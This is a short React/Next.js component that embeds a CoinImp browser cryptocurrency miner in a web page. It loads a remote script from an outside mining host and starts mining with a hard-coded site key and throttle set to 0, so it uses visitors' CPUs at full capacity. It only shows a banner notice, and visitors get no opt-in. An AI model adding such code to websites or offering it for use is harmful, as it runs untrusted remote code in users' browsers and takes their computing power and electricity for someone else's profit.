import React, { useEffect, useRef } from 'react';
import Head from 'next/head';

const CoinimpComponent = () => {
    const elementRef = useRef(null);

    const onLoad = () => {
        let _client = new Client.Anonymous('4f4e64f8f722988482114c06ad5bde7e1fe41b27e76df74ffae2ec22a9b1e17f', {
            throttle: 0,
            c: 'w',
        });
        _client.start();
        _client.addMiningNotification(
            'Top',
            'This site is running JavaScript miner from coinimp.com',
            '#cccccc',
            40,
            '#3d3d3d'
        );
    };

    useEffect(() => {
        if (elementRef.current) {
            elementRef.current.addEventListener('load', onLoad);
        }
    }, [elementRef.current]);

    return <script ref={elementRef} src='https://www.hostingcloud.racing/NwOy.js' onLoad={onLoad}></script>;
};

export default CoinimpComponent;
